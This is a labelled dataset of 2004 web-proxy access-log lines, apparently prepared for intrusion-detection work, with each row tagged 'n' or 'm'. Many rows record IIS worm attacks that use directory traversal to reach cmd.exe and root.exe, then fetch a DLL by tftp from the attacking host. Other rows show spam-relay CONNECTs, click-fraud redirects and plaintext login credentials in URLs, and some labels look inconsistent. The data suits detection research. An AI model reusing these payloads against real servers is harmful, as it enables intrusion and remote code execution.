rowIndex, row, class
15, 212.57.187.242 - - [09/Mar/2004:22:11:27 -0500] "GET https://www.chel.mts.ru/sms/cgi-bin/cgi_.exe?function=sms_send HTTP/1.1" 200 23501 "http://www.ya.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.03  [en]", n
16, 24.168.72.174 - - [09/Mar/2004:22:11:38 -0500] "GET http://sbc1.login.scd.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=exodus_510&passwd=matthew HTTP/1.0" 200 566 "-" "-", n
17, 192.117.242.67 - - [09/Mar/2004:22:12:19 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
18, 218.78.209.42 - - [09/Mar/2004:22:12:33 -0500] "CONNECT 209.15.20.26:25 HTTP/1.0" 200 - "-" "-", 
19, 203.121.182.145 - - [09/Mar/2004:22:12:55 -0500] "CONNECT 211.22.130.68:25 HTTP/1.0" 200 - "-" "-", n
20, 195.116.208.249 - - [09/Mar/2004:22:13:30 -0500] "GET http://sit0.com/foo.php HTTP/1.1" 200 84 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)", n
21, 195.116.208.249 - - [09/Mar/2004:22:13:30 -0500] "CONNECT www.bzwbk.pl:443 HTTP/1.1" 400 381 "-" "-", n
22, 195.116.208.249 - - [09/Mar/2004:22:13:30 -0500] "CONNECT wacek.one.pl:2019 HTTP/1.1" 400 381 "-" "-", n
23, 195.116.208.249 - - [09/Mar/2004:22:13:39 -0500] "GET http://sit0.com/foo.php HTTP/1.1" 200 84 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)", n
24, 195.116.208.249 - - [09/Mar/2004:22:13:39 -0500] "CONNECT www.bzwbk.pl:443 HTTP/1.1" 400 381 "-" "-", n
25, 195.116.208.249 - - [09/Mar/2004:22:13:40 -0500] "CONNECT wacek.one.pl:2019 HTTP/1.1" 400 381 "-" "-", n
26, 212.160.132.1 - - [09/Mar/2004:22:13:43 -0500] "GET http://140.99.44.61/cgi-bin/jenv.cgi HTTP/1.0" 200 965 "-" "fork()", n
27, 212.160.132.1 - - [09/Mar/2004:22:13:43 -0500] "CONNECT www.microsoft.com:80 HTTP/1.0" 200 - "-" "-", n
28, 203.61.199.63 - - [09/Mar/2004:22:13:50 -0500] "GET http://hpcgi1.nifty.com/trino/PoxyJ/prxjdg.cgi HTTP/1.0" 404 4830 "-" "Mozilla/3.0 (compatible)", n
29, 203.121.182.139 - - [09/Mar/2004:22:13:59 -0500] "CONNECT 218.234.19.62:25 HTTP/1.0" 200 - "-" "-", n
30, 192.117.242.67 - - [09/Mar/2004:22:14:42 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
31, 192.117.242.67 - - [09/Mar/2004:22:14:42 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
32, 192.117.242.67 - - [09/Mar/2004:22:17:22 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
33, 61.172.244.232 - - [09/Mar/2004:22:17:51 -0500] "CONNECT 213.81.227.129:25 HTTP/1.0" 500 436 "-" "-", n
34, 24.168.72.174 - - [09/Mar/2004:22:19:33 -0500] "GET http://login.europe.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=exodus_$$$$$$$&passwd=matthew HTTP/1.0" 200 566 "-" "-", n
35, 68.48.142.117 - - [09/Mar/2004:22:19:35 -0500] "GET /scripts/root.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
36, 192.117.242.67 - - [09/Mar/2004:22:19:36 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
37, 192.117.242.67 - - [09/Mar/2004:22:19:41 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
38, 68.48.142.117 - - [09/Mar/2004:22:20:26 -0500] "GET /scripts/root.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
39, 68.48.142.117 - - [09/Mar/2004:22:20:26 -0500] "GET /scripts/httpodbc.dll HTTP/1.0" 404 288 "-" "-", m
40, 68.48.142.117 - - [09/Mar/2004:22:21:16 -0500] "GET /MSADC/root.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
41, 218.93.92.137 - - [09/Mar/2004:22:21:38 -0500] "GET http://seekpond.com/search.php?username=johnbush&keywords=ads HTTP/1.1" 200 578 "http://www.psend.com/users/mysearch/seekpond.htm" "Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)", n
42, 68.48.142.117 - - [09/Mar/2004:22:22:07 -0500] "GET /MSADC/root.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
43, 68.48.142.117 - - [09/Mar/2004:22:22:07 -0500] "GET /MSADC/httpodbc.dll HTTP/1.0" 404 286 "-" "-", n
44, 61.53.76.40 - - [09/Mar/2004:22:22:13 -0500] "POST http://69.59.175.60/found-best.com/search.php HTTP/1.0" 502 556 "http://www.aprilgoldsgetpaid2reademail.com/pages/ptc.php" "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 5.0)", n
45, 192.117.242.67 - - [09/Mar/2004:22:22:33 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
46, 68.48.142.117 - - [09/Mar/2004:22:22:57 -0500] "GET /c/winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
47, 61.172.244.109 - - [09/Mar/2004:22:23:27 -0500] "CONNECT 69.46.18.186:25 HTTP/1.0" 200 - "-" "-", n
48, 68.48.142.117 - - [09/Mar/2004:22:23:48 -0500] "GET /c/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
49, 68.134.160.117 - - [09/Mar/2004:22:24:27 -0500] "GET http://www.glocksoft.net/cgi-bin/jenv.cgi HTTP/1.0" 200 1169 "-" "Mozilla/4.0", n
50, 68.48.142.117 - - [09/Mar/2004:22:24:38 -0500] "GET /c/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
51, 192.117.242.67 - - [09/Mar/2004:22:24:44 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
52, 192.117.242.67 - - [09/Mar/2004:22:24:45 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
53, 212.160.136.163 - - [09/Mar/2004:22:24:57 -0500] "GET http://www.xboss.us/search.php?str=online+gambling HTTP/1.0" 302 2 "-" "Mozilla/4.0 (compatible; MSIE 5.02; Windows NT 5.0)", n
54, 212.160.136.163 - - [09/Mar/2004:22:25:01 -0500] "GET http://www.xboss.us/proxy.html HTTP/1.0" 200 1371 "-" "Mozilla/4.0 (compatible; MSIE 5.02; Windows NT 5.0)", n
55, 68.48.142.117 - - [09/Mar/2004:22:25:28 -0500] "GET /c/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
56, 68.48.142.117 - - [09/Mar/2004:22:25:28 -0500] "GET /c/httpodbc.dll HTTP/1.0" 404 282 "-" "-", n
57, 218.93.92.137 - - [09/Mar/2004:22:25:32 -0500] "GET http://www.appliedsearch.net/Searchit?search&afID=2165&keywords=Program HTTP/1.1" 200 578 "http://www.myshoppingpage.com/" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0", n
58, 203.121.182.139 - - [09/Mar/2004:22:26:05 -0500] "CONNECT 213.3.5.219:25 HTTP/1.0" 200 - "-" "-", n
59, 68.48.142.117 - - [09/Mar/2004:22:26:19 -0500] "GET /d/winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
60, 210.72.122.162 - - [09/Mar/2004:22:26:36 -0500] "GET /scripts/nsiislog.dll" 404 - "-" "-", n
61, 68.48.142.117 - - [09/Mar/2004:22:27:09 -0500] "GET /d/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
62, 61.172.244.232 - - [09/Mar/2004:22:27:29 -0500] "CONNECT 61.137.101.4:25 HTTP/1.0" 200 - "-" "-", n
63, 24.168.72.174 - - [09/Mar/2004:22:27:46 -0500] "GET http://sbc2.login.dcn.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=exodusc&passwd=HELL HTTP/1.0" 200 566 "-" "-", n
64, 68.48.142.117 - - [09/Mar/2004:22:28:02 -0500] "GET /d/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
65, 203.121.182.140 - - [09/Mar/2004:22:28:44 -0500] "CONNECT 209.15.20.87:25 HTTP/1.0" 200 - "-" "-", n
66, 68.48.142.117 - - [09/Mar/2004:22:28:53 -0500] "GET /d/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
67, 68.48.142.117 - - [09/Mar/2004:22:28:53 -0500] "GET /d/httpodbc.dll HTTP/1.0" 404 282 "-" "-", n
68, 68.48.142.117 - - [09/Mar/2004:22:29:43 -0500] "GET /scripts/..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
69, 192.117.242.67 - - [09/Mar/2004:22:29:46 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
70, 192.117.242.67 - - [09/Mar/2004:22:29:54 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
71, 220.173.17.142 - - [09/Mar/2004:22:30:24 -0500] "POST http://www.clickcheaper.com/search.php HTTP/1.1" 200 19044 "http://www.163.net" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", n
72, 220.173.17.142 - - [09/Mar/2004:22:30:26 -0500] "GET http://clickcheaper.com/go.php?b=zhhhzzzizyzohchzhdzy&k=acasadsmayaoac&u=znhpzzzvsaasad&l=acasadsmayaoacdhzkhpspansyassscmcoxoafakssafanshzmzxhyzxhyazsoaxaksxsnsdaxafahavaksmaiakasafaiavaadfskcmzasksiszzyhcsiapayahaxzyzazahddvzdzxszsmzazpzdhfzhzmhszhzvzphhsicixoahsvsfsosyaohvakapsdacfpzphdahaksfdazchnskapszazhdspafahayaoaadpfxfnafscspfkzmzahdzphnsnhhsfsnazscsvakaphmaxaoafdhhchnfihzhnddzmzadkdndyaazfsdzcapakzxskaaafazzkzyzkhxamssadzfzyhpsmhkhsadhfhkzoznzizvcickcphahfsmzisvacakayhphzapspsyashysmspsihdzkzpakszsxzcaiaiadhmazaifyfodkhvavzaaksdspsyhphahxzhavananaihhadhvacsxavhkhchczhzfsvzcaksfspxmdvfpsfsvafansvhvhaaxzdzhzaahhxskazaksvafhpsxahsnznsdayscasaksyhcskdxdhxxzmzhavapakaa&s=axsssismazfp&t= HTTP/1.1" 302 0 "http://www.clickcheaper.com/search.php" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", n
73, 220.173.17.142 - - [09/Mar/2004:22:30:29 -0500] "GET http://clickcheaper.com/go.php?u=znhpzzzvsaasad&l=acasadsmayaoacdhzkhpspansyassscmcoxoafakssafanshzmzxhyzxhyazsoaxaksxsnsdaxafahavaksmaiakasafaiavaadfskcmzasksiszzyhcsiapayahaxzyzazahddvzdzxszsmzazpzdhfzhzmhszhzvzphhsicixoahsvsfsosyaohvakapsdacfpzphdahaksfdazchnskapszazhdspafahayaoaadpfxfnafscspfkzmzahdzphnsnhhsfsnazscsvakaphmaxaoafdhhchnfihzhnddzmzadkdndyaazfsdzcapakzxskaaafazzkzyzkhxamssadzfzyhpsmhkhsadhfhkzoznzizvcickcphahfsmzisvacakayhphzapspsyashysmspsihdzkzpakszsxzcaiaiadhmazaifyfodkhvavzaaksdspsyhphahxzhavananaihhadhvacsxavhkhchczhzfsvzcaksfspxmdvfpsfsvafansvhvhaaxzdzhzaahhxskazaksvafhpsxahsnznsdayscasaksyhcskdxdhxxzmzhavapakaa&k=acasadsmayaoac&b=zhhhzzzizyzohchzhdzy&s=axsssismazfp&x=&t=&tw=&f=85e9b5a1ba9a613de01a0d3c470f76bb HTTP/1.1" 302 0 "http://www.clickcheaper.com/search.php" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", m
74, 220.173.17.142 - - [09/Mar/2004:22:30:30 -0500] "GET http://www.epilot.com/click.aspx?k=cruises&b=820&p=kanoodle&s=seeky&pos=3&sid=ee77ec1d-5211-4508-a48f-27dcf3865349&l=http%3A%2F%2Fwww.kanoodle.com%2Fclickthrough.cool%3Feid%3D1%26clickid%3D12486486%26id%3D77840372%26lid%3Dbhnnbinnbknobonkbmngbknjbonnbmni%26query%3Dcruises HTTP/1.1" 302 387 "http://www.clickcheaper.com/search.php" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", m
75, 220.173.17.142 - - [09/Mar/2004:22:30:33 -0500] "GET http://www.kanoodle.com/clickthrough.cool?eid=1&clickid=12486486&id=77840372&lid=bhnnbinnbknobonkbmngbknjbonnbmni&query=cruises HTTP/1.1" 301 320 "http://www.clickcheaper.com/search.php" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", m
76, 68.48.142.117 - - [09/Mar/2004:22:30:34 -0500] "GET /scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
77, 220.173.17.142 - - [09/Mar/2004:22:30:46 -0500] "GET http://www.bestpricecruises.com/ HTTP/1.1" 200 44057 "http://www.clickcheaper.com/search.php" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", n
78, 68.48.142.117 - - [09/Mar/2004:22:31:24 -0500] "GET /scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
79, 217.136.205.206 - - [09/Mar/2004:22:32:07 -0500] "GET http://members.asstraffic.com/secure/pages/index.php HTTP/1.0" 200 566 "http://members.asstraffic.com:80" "Mozilla/4.7 ( compatible; [en]; Windows 95; win9x/NT 4.90 )", n
80, 68.48.142.117 - - [09/Mar/2004:22:32:15 -0500] "GET /scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
81, 192.117.242.67 - - [09/Mar/2004:22:32:39 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
82, 68.48.142.117 - - [09/Mar/2004:22:33:00 -0500] "GET /scripts/root.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
83, 68.48.142.117 - - [09/Mar/2004:22:33:05 -0500] "GET /scripts/..%255c../httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
84, 203.121.182.142 - - [09/Mar/2004:22:33:17 -0500] "CONNECT 219.88.69.100:25 HTTP/1.0" 200 - "-" "-", n
85, 68.48.142.117 - - [09/Mar/2004:22:33:50 -0500] "GET /scripts/root.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
86, 68.48.142.117 - - [09/Mar/2004:22:33:50 -0500] "GET /scripts/httpodbc.dll HTTP/1.0" 404 288 "-" "-", n
87, 68.48.142.117 - - [09/Mar/2004:22:33:55 -0500] "GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
88, 68.48.142.117 - - [09/Mar/2004:22:34:41 -0500] "GET /MSADC/root.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
89, 68.48.142.117 - - [09/Mar/2004:22:34:46 -0500] "GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
90, 192.117.242.67 - - [09/Mar/2004:22:34:47 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
91, 68.48.142.117 - - [09/Mar/2004:22:35:31 -0500] "GET /MSADC/root.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
92, 68.48.142.117 - - [09/Mar/2004:22:35:31 -0500] "GET /MSADC/httpodbc.dll HTTP/1.0" 404 286 "-" "-", n
93, 68.48.142.117 - - [09/Mar/2004:22:35:36 -0500] "GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
94, 24.168.72.174 - - [09/Mar/2004:22:35:48 -0500] "GET http://sbc2.login.scd.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=exodus_!!!!!!!!&passwd=HELL HTTP/1.0" 200 566 "-" "-", n
95, 217.229.136.208 - - [09/Mar/2004:22:35:55 -0500] "GET http://217.229.136.208/members/sex/fuck/id000047id/lund4050lundxxx.html HTTP/1.0" 401 0 "-" "-", n
96, 217.136.205.206 - - [09/Mar/2004:22:36:02 -0500] "GET http://members.asstraffic.com/secure/pages/index.php HTTP/1.0" 200 566 "http://www.clubsandy.com/" "Mozilla/4.73 ( compatible; MSIE 5.01; Windows NT4.0; DigiExt )", n
97, 217.229.136.208 - - [09/Mar/2004:22:36:02 -0500] "CONNECT 217.229.136.208:80 HTTP/1.0" 200 - "-" "-", n
98, 217.136.205.206 - - [09/Mar/2004:22:36:07 -0500] "GET http://members.asstraffic.com/secure/pages/index.php HTTP/1.0" 200 566 "http://www.clubsandy.com/" "Mozilla/5.0 ( compatible; [en]; Windows 98; NetCaptor )", n
99, 217.136.205.206 - - [09/Mar/2004:22:36:11 -0500] "GET http://members.asstraffic.com/secure/pages/index.php HTTP/1.0" 200 566 "http://www.clubsandy.com/" "Mozilla/5.0 ( compatible; [dk]; Windows 98; DigiExt )", n
100, 68.48.142.117 - - [09/Mar/2004:22:36:21 -0500] "GET /c/winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
101, 68.48.142.117 - - [09/Mar/2004:22:36:26 -0500] "GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
102, 68.48.142.117 - - [09/Mar/2004:22:37:11 -0500] "GET /c/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
103, 68.48.142.117 - - [09/Mar/2004:22:37:17 -0500] "GET /_vti_bin/..%255c../..%255c../..%255c../httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
104, 192.117.242.67 - - [09/Mar/2004:22:37:29 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
105, 203.61.199.15 - - [09/Mar/2004:22:37:46 -0500] "GET http://hpcgi1.nifty.com/trino/ProxyJ/prxjdg.cgi HTTP/1.0" 200 2030 "-" "Mozilla/3.0 (compatible)", n
106, 68.48.142.117 - - [09/Mar/2004:22:38:04 -0500] "GET /c/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
107, 68.48.142.117 - - [09/Mar/2004:22:38:09 -0500] "GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
108, 24.130.219.48 - - [09/Mar/2004:22:38:23 -0500] "HEAD http://members.meganqt.com/ HTTP/1.0" 200 0 "-" "Mozilla/4.0 (compatible; ICS)", n
109, 220.173.17.142 - - [09/Mar/2004:22:38:47 -0500] "POST http://www.clickcheaper.com/search.php HTTP/1.1" 200 17320 "http://www.163.net" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", n
110, 203.121.182.189 - - [09/Mar/2004:22:38:48 -0500] "CONNECT 69.56.234.22:25 HTTP/1.0" 200 - "-" "-", n
111, 220.173.17.142 - - [09/Mar/2004:22:38:52 -0500] "GET http://clickcheaper.com/go.php?b=znhzzxzyzxznznhz&k=acassismanapaiscapaxsn&u=sfasasapsdsksv&l=acassismanapaiscapaxsnfizkhosndnfodssszvznhnamshhdzxzmzxzhazsdaxaisxadsdsyafsdavszsmszakakafsvavafdfdkdvaaasfmzkhiahhyhaakazsfzdzszshohnzhhfzffizzhoaxafzmzozdzmzhzihfchcmcphhfkzvhnsnafhahnhkhyhxzozmhdhhdvzdzxszsmshfmhhzaszaoszsohdsoasdhdodoaaansfsosyaohvxmapsdhoavsvhnacaasassaxaiavssznskaxahdhzyhnfmhcxnaacmzaaiaoapsihvhsadzmhizvhosmzdhzhpsfhzapsoshzvhyhchszkhxziafhhhzfifkcizvsisnzmzyzvhpavavzvakzyzmavhvavscszzkaksoaczshczsavszakzcamakddxvdzaisosnamzzsfafzmhfznsasvsssxscspaasisozsazzdshakadhvhczyzkzhsmccdiffsphvaisyssafzczphfzzzsadaxzmaihxamsaadadhvssacafszsyzvsxaysnzpdpdofaafaisnhdadskzdsxsxaizzaiaksd&s=axsssismazfp&t= HTTP/1.1" 302 0 "http://www.clickcheaper.com/search.php" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", m
112, 68.48.142.117 - - [09/Mar/2004:22:38:55 -0500] "GET /c/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
113, 68.48.142.117 - - [09/Mar/2004:22:38:55 -0500] "GET /c/httpodbc.dll HTTP/1.0" 404 282 "-" "-", n
114, 61.172.244.109 - - [09/Mar/2004:22:38:56 -0500] "CONNECT 200.91.211.4:25 HTTP/1.0" 500 430 "-" "-", n
115, 220.173.17.142 - - [09/Mar/2004:22:38:56 -0500] "GET http://clickcheaper.com/go.php?u=sfasasapsdsksv&l=acassismanapaiscapaxsnfizkhosndnfodssszvznhnamshhdzxzmzxzhazsdaxaisxadsdsyafsdavszsmszakakafsvavafdfdkdvaaasfmzkhiahhyhaakazsfzdzszshohnzhhfzffizzhoaxafzmzozdzmzhzihfchcmcphhfkzvhnsnafhahnhkhyhxzozmhdhhdvzdzxszsmshfmhhzaszaoszsohdsoasdhdodoaaansfsosyaohvxmapsdhoavsvhnacaasassaxaiavssznskaxahdhzyhnfmhcxnaacmzaaiaoapsihvhsadzmhizvhosmzdhzhpsfhzapsoshzvhyhchszkhxziafhhhzfifkcizvsisnzmzyzvhpavavzvakzyzmavhvavscszzkaksoaczshczsavszakzcamakddxvdzaisosnamzzsfafzmhfznsasvsssxscspaasisozsazzdshakadhvhczyzkzhsmccdiffsphvaisyssafzczphfzzzsadaxzmaihxamsaadadhvssacafszsyzvsxaysnzpdpdofaafaisnhdadskzdsxsxaizzaiaksd&k=acassismanapaiscapaxsn&b=znhzzxzyzxznznhz&s=axsssismazfp&x=&t=&tw=&f=62683599fe13f479160d189c8e3ae8fc HTTP/1.1" 302 0 "http://www.clickcheaper.com/search.php" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", m
116, 220.173.17.142 - - [09/Mar/2004:22:38:57 -0500] "GET http://www.epilot.com/click.aspx?k=automobiles&b=320&p=kanoodle&s=seeky&pos=2&sid=b249b11f-66ef-4dd0-b111-291ecb6e205e&l=http%3A%2F%2Fwww.kanoodle.com%2Fclickthrough.cool%3Feid%3D1%26clickid%3D12486486%26id%3D70509698%26lid%3Dbhnnbingbknlbongbmnpbknmbonpbmno%26query%3Dautomobiles HTTP/1.1" 302 391 "http://www.clickcheaper.com/search.php" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", m
117, 220.173.17.142 - - [09/Mar/2004:22:38:58 -0500] "GET http://www.kanoodle.com/clickthrough.cool?eid=1&clickid=12486486&id=70509698&lid=bhnnbingbknlbongbmnpbknmbonpbmno&query=automobiles HTTP/1.1" 301 363 "http://www.clickcheaper.com/search.php" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", n
